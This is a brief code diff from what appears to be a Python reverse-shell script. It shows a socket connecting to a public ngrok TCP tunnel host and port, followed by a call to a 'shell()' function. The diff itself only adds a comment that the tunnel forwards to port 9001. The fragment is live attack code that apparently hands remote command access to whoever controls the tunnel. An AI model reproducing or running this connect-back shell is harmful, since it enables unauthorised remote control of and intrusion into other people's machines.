@@ -295,7 +295,7 @@ def shell():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connection()
-sock.connect(("6.tcp.ngrok.io", 14893))
+sock.connect(("6.tcp.ngrok.io", 14893)) # ngrok tcp 9001
 print("connected")
 shell()
 sock.close()
